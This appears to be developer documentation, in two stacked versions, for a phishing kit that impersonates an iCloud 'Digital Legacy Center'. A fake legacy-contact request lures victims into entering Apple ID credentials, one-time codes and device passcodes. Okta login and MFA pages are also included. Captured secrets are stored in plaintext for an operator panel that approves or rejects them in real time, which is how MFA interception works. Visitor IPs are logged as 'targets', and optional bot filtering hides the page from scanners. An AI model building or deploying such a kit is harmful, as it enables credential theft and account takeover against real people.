# App Documentation — iCloud Digital Legacy Center

Current reference for the `consumers-t` Next.js application after migration to PostgreSQL + Prisma + tRPC.

---

## 1. Project overview

- **Name:** `consumers-t` (UI title: **iCloud | Digital Legacy Center**)
- **Stack:** Next.js 15 (App Router), React 19, PostgreSQL, Prisma, tRPC
- **Runtime:** Node.js in development, Cloudflare Workers in production via OpenNext
- **Package manager:** Bun (lockfile: `bun.lock`)

### 1.1 Scripts (`package.json`)

| Script | Command | Purpose |
|--------|---------|---------|
| `dev` | `next dev` | Run dev server |
| `build` | `next build` | Production build |
| `start` | `next start` | Serve production build |
| `lint` | `next lint` | ESLint |
| `prisma:generate` | `prisma generate` | Generate Prisma client |
| `prisma:migrate` | `prisma migrate dev` | Run DB migrations in dev |
| `preview` | `opennextjs-cloudflare build && opennextjs-cloudflare preview` | Cloudflare preview |
| `deploy` | `opennextjs-cloudflare build && opennextjs-cloudflare deploy` | Cloudflare deploy |

### 1.2 Key dependencies

- **Data/API:** `@prisma/client`, `prisma`, `@trpc/server`, `@trpc/client`, `@trpc/react-query`, `@tanstack/react-query`, `zod`, `superjson`
- **UI/state:** `@ark-ui/react`, `radix-ui`, `jotai`, `react-icons`, `react-spinners`, `react-loader-spinner`
- **Infra/deploy:** `@opennextjs/cloudflare`, `wrangler`

---

## 2. Architecture summary

- Single route (`/`) with UI controlled by `app/(tropic)/TropicProvider.jsx`.
- State and event data come from tRPC procedures backed by Prisma/PostgreSQL.
- Realtime behavior uses tRPC subscriptions + in-process pubsub (`EventEmitter`) to push updates.

```mermaid
flowchart LR
  ui[ReactClient] --> trpcClient[tRPCClient]
  trpcClient --> trpcRoute[/api/trpc]
  trpcRoute --> trpcRouter[tRPCRouter]
  trpcRouter --> prisma[PrismaClient]
  prisma --> postgres[(PostgreSQL)]
  trpcRouter --> pubsub[EventEmitterPubSub]
  pubsub --> trpcClient
```

---

## 3. App shell and providers

- **`app/layout.js`**
  - Sets metadata title.
  - Wraps UI with:
    - `TRPCProvider` (`app/components/providers/TRPCProvider.jsx`)
    - `TropicProvider` (`app/(tropic)/TropicProvider.jsx`)

- **`app/page.jsx`**
  - Empty fragment; flow UI is mounted by `TropicProvider`.

---

## 4. Data layer

### 4.1 Prisma

- **Schema:** `prisma/schema.prisma`
- **Client singleton:** `app/server/db/prisma.js`
- **Initial migration SQL:** `prisma/migrations/0001_init/migration.sql`

### 4.2 Core models

- `targets` — target/session records (`status`, `intake_page_name`, `useragent`, `owner_group_id`, `ip`)
- `intake_states` — flow state per target (`gameplan_step`, `force_load`)
- `gameplans` — pages sequence JSON per target (`pages`)
- `intake_events` — interaction/input/checkpoint event log
- `intake_pages` — intake page activation table (reserved; middleware currently passes through)

---

## 5. tRPC layer

- **Router init:** `app/server/trpc/init.js`
- **Main router:** `app/server/trpc/router.js`
- **API endpoint:** `app/api/trpc/[trpc]/route.js`
- **Client helpers:** `app/utils/trpc/client.js`, `app/utils/trpc/react.js`, `app/utils/trpc/baseUrl.js`

### 5.1 Main procedures

- `targets.create`
- `intakeState.getByTarget`
- `intakeState.incrementStep`
- `gameplans.getByTarget`
- `intakeEvents.listByTarget`
- `intakeEvents.add`
- `checkpoints.existsWaiting`
- `checkpoints.resolveDual`
- `intakePages.isActive`

### 5.2 Subscriptions

- `intakeState.onUpdate`
- `gameplans.onUpdate`
- `intakeEvents.onUpdate`
- `checkpoints.onResolution`

---

## 6. Flow controller (`TropicProvider`)

**File:** `app/(tropic)/TropicProvider.jsx`

Responsibilities:
- Resolves `targetId` through `getTargetId()`.
- Loads initial `intakeState`, `gameplan`, and `intakeEvents` from tRPC.
- Maintains current flow page: `gameplan.pages[intakeState.gameplan_step]?.name`.
- Subscribes to tRPC updates for `intake_states`, `gameplans`, `intake_events`.
- Adds initial `"Loaded page"` interaction event.
- Renders page component by logical step (`Login`, `OTP`, `Digital Legacy Request`, `Success`).

Fallback behavior:
- If target creation fails or DB is not configured, app can use `dev-target-no-db` and fallback login step.

---

## 7. User input capture and checkpoints

### 7.1 Login (`app/components/Login/Login.jsx`)

- Captures username/email and password steps.
- Emits events:
  - `input_title: "Username"`
  - `input_title: "Password"`
  - interaction events such as `Submit login`
- Uses checkpoint resolution `Valid login confirmation`.
- On `good` -> advances step; on `bad` -> shows error and clears password.

### 7.2 OTP (`app/components/Otp/Otp.jsx`)

- Captures 6-digit OTP via `OTPInput`.
- Emits events:
  - `input_title: "OTP"`
  - `interaction_title: "Submit OTP"`
- Uses checkpoint resolution `Valid OTP confirmation`.
- On `good` -> advances step; on `bad` -> shows error and clears code.

### 7.3 Okta components

Okta components (`OktaLogin/*`, `OktaMFA/*`) are present and now use the same tRPC checkpoint/event pipeline where referenced.

---

## 8. Sensitive data handling

Sensitive inputs (**Password**, **OTP**, **Okta TOTP**, **iPhone Passcode**) are **stored in plaintext** in `intake_events`:

- `app/server/trpc/router.js` — `intakeEvents.add` persists `input_value` as received; no hashing or redaction.
- The pp banging panel requires operators to see submitted values (e.g. OTP) in Submission Controls to Accept or Reject checkpoints.
- Values are stored so the panel can display them for operator review and resolution.

---

## 9. Server action and helper utilities

- **`app/actions/createTarget.js`**
  - Creates target row via Prisma.
  - Initializes default `intake_states` and `gameplans` rows.
  - Captures IP from request headers.
  - Returns fallback `dev-target-no-db` if DB config/connection fails.

- **`app/(tropic)/getTargetId.js`**
  - Client helper for retrieving/storing `target_id` cookie.
  - Deduplicates concurrent target creation requests with a shared pending promise.

- **`app/(tropic)/addIntakeEvent.js`**
  - Calls `trpc.intakeEvents.add`.

- **`app/(tropic)/checkForExistingCheckpoint.js`**
  - Calls `trpc.checkpoints.existsWaiting`.

- **`app/(tropic)/resolveDualCheckpoint.js`**
  - Calls `trpc.checkpoints.resolveDual`.

- **`app/(tropic)/proceedStep.js`**
  - Calls `trpc.intakeState.incrementStep`.

---

## 10. Middleware

**File:** `middleware.js`

- Current behavior: pass-through (`NextResponse.next()`).
- Bot filtering and page-active checks are intentionally disabled/commented.

---

## 11. Environment variables

| Variable | Purpose |
|----------|---------|
| `DATABASE_URL` | PostgreSQL connection URL for Prisma |
| `INTAKE_PAGE_NAME` | Stored in new `targets` rows |
| `OWNER_GROUP_ID` | Stored in new `targets` rows |
| `INTAKE_PAGE_ID` | Reserved for middleware/page activation checks if re-enabled |

---

## 12. High-level structure

```text
app/
  api/trpc/[trpc]/route.js
  actions/createTarget.js
  server/
    db/prisma.js
    realtime/pubsub.js
    trpc/
      init.js
      router.js
      types.js
  utils/trpc/
    baseUrl.js
    client.js
    react.js
  components/providers/TRPCProvider.jsx
  (tropic)/TropicProvider.jsx
  (tropic)/getTargetId.js
  (tropic)/addIntakeEvent.js
  (tropic)/checkForExistingCheckpoint.js
  (tropic)/resolveDualCheckpoint.js
  (tropic)/proceedStep.js
prisma/
  schema.prisma
  migrations/0001_init/migration.sql
middleware.js
```

This document reflects the current code state after the Supabase -> PostgreSQL/tRPC migration.
# App Documentation — iCloud Digital Legacy Center

A detailed reference for the **consumers-t** Next.js application: structure, flow, data, and behavior.

---

## 1. Project overview

- **Name:** consumers-t (package name), presented as **iCloud | Digital Legacy Center**
- **Stack:** Next.js 15 (App Router), React 19, Supabase (auth/database/realtime), deployment to **Cloudflare** via OpenNext
- **Runtime:** Node (dev) / Cloudflare Workers (production via `@opennextjs/cloudflare`)
- **Package manager:** npm / bun (see `bun.lock`)

### 1.1 Scripts (`package.json`)

| Script | Command | Purpose |
|--------|---------|--------|
| `dev` | `next dev` | Local development server |
| `build` | `next build` | Production build |
| `start` | `next start` | Run production build locally |
| `lint` | `next lint` | ESLint |
| `preview` | `opennextjs-cloudflare build && opennextjs-cloudflare preview` | Build + preview Cloudflare deployment |
| `deploy` | `opennextjs-cloudflare build && opennextjs-cloudflare deploy` | Deploy to Cloudflare |
| `cf-typegen` | `wrangler types --env-interface CloudflareEnv cloudflare-env.d.ts` | Generate Cloudflare env types |

### 1.2 Key dependencies

- **UI / state:** `@ark-ui/react`, `radix-ui`, `jotai`, `react-icons`, `react-spinners`, `react-loader-spinner`
- **Backend / auth:** `@supabase/ssr`, `@supabase/supabase-js`
- **Deployment:** `@opennextjs/cloudflare`, `wrangler`
- **Utilities:** `isbot`, `next-client-cookies` (cookies used via custom helpers in `getTargetId.js`)
- **Styling:** `sass`

---

## 2. Architecture summary

- **Single URL route:** Only `/` (root). File: `app/page.jsx` (renders an empty fragment).
- **All UI is driven by** `app/(tropic)/TropicProvider.jsx`, which wraps the app in `app/layout.js`.
- **Logical “pages”** are steps in a linear flow, determined by `gameplan.pages[intakeState.gameplan_step].name`. There are no additional file-based routes.

---

## 3. Root layout and entry

- **`app/layout.js`**
  - Sets metadata: `title: "iCloud | Digital Legacy Center"`.
  - Loads fonts: Geist, Geist_Mono, Open_Sans (from `next/font/google`).
  - Imports `app/globals.css`.
  - Wraps `children` in `<Provider>` (TropicProvider).

- **`app/page.jsx`**
  - Exports a default component that renders `<></>`. The real UI is entirely inside TropicProvider.

- **`app/globals.css`**
  - Global box-sizing: `border-box` for `html, body` and all descendants.

---

## 4. TropicProvider — flow and state

**File:** `app/(tropic)/TropicProvider.jsx`  
**Role:** Client-side root that owns session, Supabase state, and which “page” is shown.

### 4.1 Target ID and session

- **`useTargetId()` hook**
  - On mount, calls `getTargetId()` once (deduplicated via module-level `pendingPromise`).
  - Returns `{ targetId, isLoading, error }`.
  - If Supabase is unavailable or env is missing, `createTarget` returns `'dev-target-no-db'` and the app still runs with a fallback gameplan (Login step only).

### 4.2 State

- **`targetId`** — From `useTargetId()`; used for all Supabase queries and realtime filters.
- **`intakeState`** — Row from `intake_states` for this `target_id` (includes `gameplan_step`, etc.).
- **`gameplan`** — Row from `gameplans` for this `target_id`; has `pages: [{ name: 'Login' }, ...]`.
- **`intakeEvents`** — List of events from `intake_events` for this `target_id`.
- **`currentPage`** — Derived: `gameplan.pages[intakeState.gameplan_step]?.name`.
- **`loading`** — True while `targetIdLoading` or `!intakeState` or `!gameplan` or `intakeState?.force_load`.

### 4.3 Data initialization (when `targetId` is set)

- If `targetId === 'dev-target-no-db'`: sets fallback state (`gameplan_step: 0`, single page `Login`) and skips Supabase.
- Otherwise:
  - Fetches `intake_states`, `gameplans`, `intake_events` for `target_id`.
  - If no data: same fallback as above (show Login).
  - Otherwise sets `intakeState`, `gameplan`, `intakeEvents`.
  - Calls `addPageLoadedEvent(targetId)` (adds “Loaded page” interaction).
  - Sets up **realtime subscriptions** for `intake_states`, `gameplans`, `intake_events` filtered by `target_id`, and updates local state on changes.

### 4.4 Realtime subscriptions

- **Channels:** `provider-intake-states-${targetId}`, `provider-gameplans-${targetId}`, `provider-intake-events-${targetId}`.
- **Tables:** `intake_states`, `gameplans`, `intake_events` with `target_id=eq.${targetId}`.
- **Behavior:** INSERT/UPDATE sets state from `payload.new`; for `intake_events` DELETE removes the event from local list.

### 4.5 Rendering and loading/error UI

- **Target ID loading:** Shows `<Loader />` until `targetId` is resolved.
- **Target ID error:** Renders an error container (“Error initializing session”).
- **Normal:** Renders `<Nav />`, then the component for `currentPage`, then `<Footer />`. While `loading` is true, also shows `<Loader />` overlay.

### 4.6 Page → component mapping (active)

| `currentPage` (from gameplan) | Component |
|-------------------------------|-----------|
| `Login` | `app/components/Login/Login.jsx` |
| `OTP` | `app/components/Otp/Otp.jsx` |
| `Digital Legacy Request` | `app/components/DigitalLegacy/DigitalLegacy.jsx` |
| `Success` | `app/components/Success/Success.jsx` |

Okta-related pages (Okta Login, Okta MFA, Okta Timekill, Okta Success, Okta Script Execution) are commented out in TropicProvider; their components exist but are not in the active flow.

---

## 5. User flow (active steps)

1. **Login** — Apple ID–style sign-in: email/phone then password. Submits to backend (checkpoint “Valid login confirmation”); on resolution `good` calls `proceedStep()`, on `bad` shows error and clears password.
2. **OTP** — 6-digit verification code (OTPInput). Same checkpoint pattern (“Valid OTP confirmation”); resend logs an interaction.
3. **Digital Legacy Request** — User sees a “legacy contact” request (Angel Quinones). Actions: “Block request” or “Approve request”; then a passcode entry modal; on finish, `proceedStep()`.
4. **Success** — “Request blocked” confirmation and “You may now close this page.”

Step advancement is done via `proceedStep()` (Supabase RPC `increment_gameplan_step`). Which step is shown comes from `intakeState.gameplan_step` and `gameplan.pages`.

---

## 6. Components (detailed)

### 6.1 Layout

- **Nav** (`app/components/Nav/Nav.jsx`) — Renders iCloud logo image (`/icloud-logo.svg`).
- **Footer** (`app/components/Footer/Footer.jsx`) — Links: System Status, Privacy Policy, Terms & Conditions; copyright 2025 Apple Inc. (no refresh handler in current code).
- **Loader** (`app/components/Loader/Loader.jsx`) — Full-screen loading with `RotatingLines` and Footer.

### 6.2 Login (`app/components/Login/Login.jsx`)

- **Stages:** 0 = email/phone only; 1 = email/phone + password.
- **Validation:** Username = email or 10–15 digit phone; password length ≥ 6.
- **Events:** “Started entering username”, “Started entering password”, “Username”/“Password” input, “Submit login”.
- **Checkpoint:** Before subscribing, ensures one “Valid login confirmation” checkpoint (dual, waiting). Subscribes to `intake_events`; when that checkpoint is resolved with `good` → `proceedStep()`; with `bad` → show error “Check the account information you entered and try again.” and clear password.
- **On unmount/reload:** Clears any existing “Valid login confirmation” checkpoint with resolution `stale`.
- **Links:** “Forgot password?” to Apple iforgot URL. “Keep me signed in” checkbox (no logic).
- **Assets:** `/apple-acc.svg` in card.

### 6.3 OTP (`app/components/Otp/Otp.jsx`)

- **Input:** 6-digit code via `OTPInput` (numeric only). Auto-submits when length is 6.
- **Events:** “OTP” input, “Submit OTP”, “Tapped resend code” (resend is visual only, no backend send).
- **Checkpoint:** Same pattern as Login but for “Valid OTP confirmation”. Resolved `good` → `proceedStep()`; `bad` → “Incorrect verification code”, clear code.
- **On mount:** Clears any existing “Valid OTP confirmation” checkpoint as `stale`.
- **Copy:** “Enter the verification code sent to your Apple devices”; link about Find Devices / Manage Devices.

### 6.4 OTPInput (`app/components/OTPInput/OTPInput.jsx`)

- **Role:** Accessible, mobile-friendly OTP field. Single hidden input + display “cells” for cursor/visual state.
- **Props:** `value`, `onChange`, `onComplete`, `length` (default 6), `autoFocus`, `disabled`, `required`, `allowAlphanumeric`, `className`, `inputClassName`, `aria-label`, `aria-describedby`, `id`, `onFocus`.
- **Behavior:** Filters input to digits (or alphanumeric if allowed), syncs selection with focused cell, supports arrow keys/Home/End, Enter calls `onComplete` when full.

### 6.5 DigitalLegacy (`app/components/DigitalLegacy/DigitalLegacy.jsx`)

- **Content:** Explains legacy contact request; shows contact “Angel Quinones” / angelrquinones98@gmail.com; “Block request” and “Approve request” buttons.
- **Events:** “Approved legacy request” or “Blocked legacy request” then shows `PasscodeEntry` overlay.
- **PasscodeEntry (internal):** 6-digit passcode. Rejects a list of common wrong codes (e.g. 123456, 111111) with shake; on valid 6 digits calls `onFinish()` which calls `proceedStep()` after a short delay. Uses aggressive focus logic for mobile (tap/click to focus).

### 6.6 Success (`app/components/Success/Success.jsx`)

- **Content:** “Request blocked”, message that Angel Quinones’s legacy request has been blocked and ticket closed; “You may now close this page.” Uses `/apple-acc.svg`.

---

## 7. Server actions and server-side helpers

### 7.1 Server action (HTTP-callable from client)

- **createTarget** (`app/actions/createTarget.js`)
  - `'use server'`. Called with `ua` (user agent).
  - If `NEXT_PUBLIC_SUPABASE_*` env not set → returns `{ id: 'dev-target-no-db' }`.
  - On Supabase connection errors (e.g. ConnectionRefused) → same dev fallback.
  - Otherwise: inserts into `targets` with `status: 'live'`, `intake_page_name` from `INTAKE_PAGE_NAME` (default `"iCloud"`), `useragent`, `owner_group_id` from env, `ip` from headers (`x-forwarded-for`, `x-real-ip`, `cf-connecting-ip`, `true-client-ip`). Returns `{ id: data.id }`.

### 7.2 Client-callable helpers (run on server or in client context)

- **getTargetId** (`app/(tropic)/getTargetId.js`) — **Client.** Reads cookie `target_id`; if missing, calls `createTarget(navigator.userAgent)`, sets cookie (path `/`, max-age 2h, SameSite Lax), returns id. Deduplicates concurrent calls with `pendingPromise`.
- **proceedStep** (`app/(tropic)/proceedStep.js`) — Gets `targetId` via `getTargetId()`, calls Supabase RPC `increment_gameplan_step(target_id_arg)`, returns `{ data }` or `{ error }`.
- **addIntakeEvent** (`app/(tropic)/addIntakeEvent.js`) — Inserts `intakeEvent` into `intake_events` (client Supabase).
- **checkForExistingCheckpoint** (`app/(tropic)/checkForExistingCheckpoint.js`) — Returns whether there is an `intake_events` row for current target with given `resolution` and `checkpoint_status: 'waiting'`.
- **resolveDualCheckpoint** (`app/(tropic)/resolveDualCheckpoint.js`) — Exported as `clientResolveDualCheckpoint`. Finds waiting checkpoint by `resolution`, updates it to `checkpoint_status: 'resolved'` and `checkpoint_dual_outcome: dualOutcome` (e.g. `good`/`bad`/`stale`).
- **brandLogoSrc** (`app/(tropic)/brandLogoSrc.js`) — Constant URL string (Okta CDN); not used in the active flow.

---

## 8. Supabase

### 8.1 Client creation

- **Server:** `app/utils/supabase/server.js` — `createServerClient` with `@supabase/ssr` and Next `cookies()`.
- **Browser:** `app/utils/supabase/client.js` — `createBrowserClient` with `NEXT_PUBLIC_SUPABASE_URL` and `NEXT_PUBLIC_SUPABASE_ANON_KEY`.

### 8.2 Tables used

- **targets** — Insert-only from `createTarget`. Columns referenced: `id`, `status`, `intake_page_name`, `useragent`, `owner_group_id`, `ip`.
- **intake_states** — One row per target; at least `target_id`, `gameplan_step`; updated (e.g. by RPC or backend) and synced via realtime.
- **gameplans** — One row per target; at least `target_id`, `pages` (array of `{ name }`). Synced via realtime.
- **intake_events** — Append/update; columns include `target_id`, `type`, `interaction_title`, `input_title`, `input_value`, `checkpoint_status`, `checkpoint_resolution`, `checkpoint_type`, `checkpoint_dual_outcome`.
- **intake_pages** — Referenced in middleware only: `id` = `INTAKE_PAGE_ID`, `active`; used to decide 503 when middleware logic is enabled.

### 8.3 RPC

- **increment_gameplan_step(target_id_arg)** — Called by `proceedStep()`; expected to advance `gameplan_step` for the given target (and return updated row or step count).

### 8.4 Realtime

- Used in TropicProvider for `intake_states`, `gameplans`, `intake_events` (filter `target_id=eq.${targetId}`).
- Login and OTP components subscribe to `intake_events` for their checkpoint resolution.

---

## 9. Middleware

**File:** `middleware.js` (root).

- **Current behavior:** Always `NextResponse.next()` (no blocking). Bot checks and intake-page checks are commented out.
- **When enabled (commented code):** Uses `isbot(userAgent)` and custom bot patterns; calls `checkIfPageOn()` which queries `intake_pages` for `id = process.env.INTAKE_PAGE_ID` and `active === true`. If bot or page not active → 503 with `Retry-After: 5184000`, `Cache-Control: no-store, max-age=0`.
- **Matcher:** Route matcher is commented out; if restored it would apply to all except `_next/static`, `_next/image`, `favicon.ico`, `api/`.

---

## 10. Environment variables

| Variable | Used in | Purpose |
|----------|---------|--------|
| `NEXT_PUBLIC_SUPABASE_URL` | Supabase client/server | Supabase project URL |
| `NEXT_PUBLIC_SUPABASE_ANON_KEY` | Supabase client/server | Supabase anon key |
| `INTAKE_PAGE_NAME` | createTarget | `intake_page_name` in `targets` (default `"iCloud"`) |
| `OWNER_GROUP_ID` | createTarget | `owner_group_id` in `targets` |
| `INTAKE_PAGE_ID` | middleware (when enabled) | Row in `intake_pages` to check `active` for 503 |

No `app/api/` routes; no other HTTP endpoints. All server-side behavior is via the single server action and the above helpers.

---

## 11. Checkpoint / dual-outcome system

- **Purpose:** Backend (or another process) decides whether a login or OTP is valid without the front-end knowing in advance.
- **Flow:** Front-end creates an `intake_events` row with `type: 'checkpoint'`, `checkpoint_status: 'waiting'`, `checkpoint_resolution: '<name>'`, `checkpoint_type: 'dual'`. It subscribes to `intake_events`; when that row is updated to `checkpoint_status: 'resolved'` and `checkpoint_dual_outcome` is `good` or `bad`:
  - **good** → `proceedStep()` (advance to next page).
  - **bad** → Show error, clear sensitive input, do not advance.
- **Stale:** If user leaves or reloads, front-end resolves the checkpoint with outcome `stale` so the same checkpoint is not reused.

---

## 12. Styling

- **Global:** `app/globals.css`; `app/(tropic)/TropicGlobal.scss` imported in TropicProvider.
- **Per-component:** SCSS files next to components (e.g. `Login.scss`, `Otp.scss`, `DigitalLegacy.scss`, `Success.scss`, `Footer.scss`, `Nav.scss`, `Loader.scss`, `OktaLogin.scss`, `OktaMFA.scss`, etc.).
- **Path alias:** `@/` → project root (`jsconfig.json`).

---

## 13. Build and deployment

- **Next:** `next.config.mjs` — `reactStrictMode: false`.
- **OpenNext Cloudflare:** `open-next.config.ts` uses `defineCloudflareConfig()`.
- **Wrangler:** `wrangler.jsonc` — name `icloud`, worker from `.open-next/worker.js`, assets from `.open-next/assets`, `nodejs_compat`, compatibility date 2025-03-25.

---

## 14. Other files (reference)

- **atoms.js** — Jotai `targetIdAtom` (uses `getTargetId()`); not required for the current TropicProvider flow.
- **Okta* components** — OktaLogin (UsernameForm, PasswordForm), OktaMFA (Push, EnterCode), etc. Present but not rendered in the active gameplan.
- **ReviewTrans / Review3Trans / NewDevice** — Present in repo; not referenced in TropicProvider.
- **Public assets:** Referenced in code: `/apple-acc.svg`, `/icloud-logo.svg` (typically in `public/`).

---

## 15. File structure (high level)

```
app/
  layout.js
  page.jsx
  globals.css
  (tropic)/
    TropicProvider.jsx
    TropicGlobal.scss
    getTargetId.js
    proceedStep.js
    addIntakeEvent.js
    checkForExistingCheckpoint.js
    resolveDualCheckpoint.js
    brandLogoSrc.js
    atoms.js
  actions/
    createTarget.js
  components/
    Login/, Otp/, DigitalLegacy/, Success/, Nav/, Footer/, Loader/
    OTPInput/, OktaLogin/, OktaMFA/, NewDevice/, ReviewTrans/, Review3Trans/
  utils/
    supabase/
      server.js
      client.js
middleware.js
next.config.mjs
open-next.config.ts
wrangler.jsonc
```

This document reflects the codebase as of the last review and is intended as the single source of truth for app structure, flow, and behavior.
